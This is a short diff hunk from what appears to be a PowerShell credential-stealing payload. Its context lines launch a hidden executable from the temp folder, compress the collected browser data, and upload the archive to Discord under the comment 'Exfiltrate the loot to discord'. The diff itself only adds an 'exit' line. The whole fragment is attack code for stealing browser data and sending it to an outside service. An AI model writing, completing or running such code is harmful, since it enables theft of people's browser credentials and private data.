@@ -35,3 +35,4 @@ cd $env:tmp;Start-Process -FilePath "$env:tmp\browser.exe" -WindowStyle h -Wait
 # Exfiltrate the loot to discord
 Compress-Archive -Path "$env:tmp\results" -DestinationPath $env:tmp\browserdata.zip
 Upload-Discord -file "$env:tmp\browserdata.zip"
+exit
